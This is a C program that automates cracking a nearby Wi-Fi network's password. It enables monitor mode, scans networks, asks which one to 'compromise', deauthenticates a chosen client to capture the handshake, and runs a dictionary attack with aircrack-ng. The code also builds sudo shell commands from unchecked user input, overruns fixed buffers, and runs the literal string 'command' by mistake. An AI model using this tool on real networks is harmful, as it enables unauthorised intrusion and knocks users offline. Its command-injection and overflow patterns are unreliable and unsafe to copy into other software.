#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <unistd.h>


int main() {
	
	//int choice;
	char access_point[19];
	char client[19];
	char interface[20]; // stores wireless interface name
	char command[100]; // used to store any commands given to the terminal
	command[0] = '\0'; // clears any garbage stored in memory
	
	system("iwconfig");
	
	printf(">>> Please enter the name of your wireless interface card: (wlan0, wlan1 etc...): ");
	scanf("%s",interface);
    strcat(command,"sudo airmon-ng check kill");
    system("command");
    command[0] = '\0';
	strcat(command,"sudo airmon-ng start "); // activates the wifi card
	strcat(command,interface);
	system(command);

	system("iwconfig");
	printf(">>> Please re-enter the name of your wireless interface card that is in monitor mode: (wlan0, wlan1, wlan0mon, wlan1mon etc ...): ");
	scanf("%s",interface);
	
	printf("Sniffing networks ... ");
	
	command[0] = '\0';
	strcat(command,"sudo timeout --foreground 15 airodump-ng "); 
	strcat(command,interface);
	strcat(command," > firstdump.txt");
	system(command);



    printf(">>> The following are nearby Wi-Fi networks: \n");
	system("python3 stripdump.py");
	sleep(2);
	
	
	printf(">>> Which network would you like to compromise? (Enter the BSSID that appears next to the WiFi Name xx:xx:xx:xx:xx:xx) \n");
	printf("Example: \nA3:B4:5C:D7:E9:F0 WifiName\nYour Entry should be: A3:B4:5C:D7:E9:F0\n\n");
	printf("BSSID: ");
	scanf("%s",&access_point);


	system("cat firstdump.txt");
	printf("Look for the BSSID you just copied, now copy and paste any of the BSSID that appear next to it (under Station)\n");
	printf("Example: \nA3:B4:5C:D7:E9:F0 WifiName\nYour Entry should be: A3:B4:5C:D7:E9:F0\n\n");
	printf("BSSID: ");
	scanf("%s",&client);

	command[0] = '\0';
	strcat(command,"sudo timeout --foreground 15 aireplay-ng -0 100 -a "); 
	strcat(command,access_point);
	strcat(command," -c ");
	strcat(command,client);
	strcat(command," ");
	strcat(command,interface);
	strcat(command, " & sudo timeout --foreground 15 airodump-ng --bssid ");
	strcat(command,access_point);
	strcat(command," -w output.cap ");
	strcat(command,interface);
	system(command);

	sleep(20);

	command[0] = '\0';
	strcat(command,"sudo aircrack-ng dict.txt -b ");
	strcat(command,access_point);
	strcat(command," output.cap");
	system(command);



	return 0;
}
